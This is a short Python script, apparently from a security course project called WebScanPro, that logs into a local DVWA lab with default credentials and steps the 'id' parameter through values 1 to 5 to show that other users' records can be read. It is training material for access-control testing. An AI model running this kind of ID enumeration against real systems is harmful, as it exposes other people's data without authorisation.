import requests
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "http://localhost:8080"
LOGIN_URL = f"{BASE_URL}/login.php"
# Target the SQLi page because it reflects user data based on the 'id' parameter
TARGET_PATH = "vulnerabilities/sqli/" 

session = requests.Session()

def login():
    # Standard DVWA Login Logic (Required to reach the IDOR page)
    res = session.get(LOGIN_URL)
    soup = BeautifulSoup(res.text, 'html.parser')
    token = soup.find('input', {'name': 'user_token'})['value']
    
    login_data = {
        "username": "admin",
        "password": "password",
        "user_token": token,
        "Login": "Login"
    }
    session.post(LOGIN_URL, data=login_data)
    # Set security to low via cookie to ensure IDOR is testable
    session.cookies.set("security", "low")

def run_idor_test():
    print("--- [WebScanPro] Starting Week 6: IDOR & Access Control Testing ---")
    print(f"[*] Testing parameter 'id' on {TARGET_PATH}\n")
    
    # Simulate an attacker changing the ID from 1 to 5 to see other users
    for user_id in range(1, 6):
        test_url = f"{BASE_URL}/{TARGET_PATH}?id={user_id}&Submit=Submit"
        response = session.get(test_url)
        
        if "First name:" in response.text:
            # Simple parsing to extract the data found
            soup = BeautifulSoup(response.text, 'html.parser')
            result = soup.find('pre') # DVWA displays SQLi/IDOR results in <pre> tags
            if result:
                clean_data = result.get_text().replace('\n', ' ').strip()
                print(f"[!] IDOR SUCCESS: Accessing User ID {user_id} -> {clean_data}")
        else:
            print(f"[-] ID {user_id}: No data or access denied.")

if __name__ == "__main__":
    login()
    run_idor_test()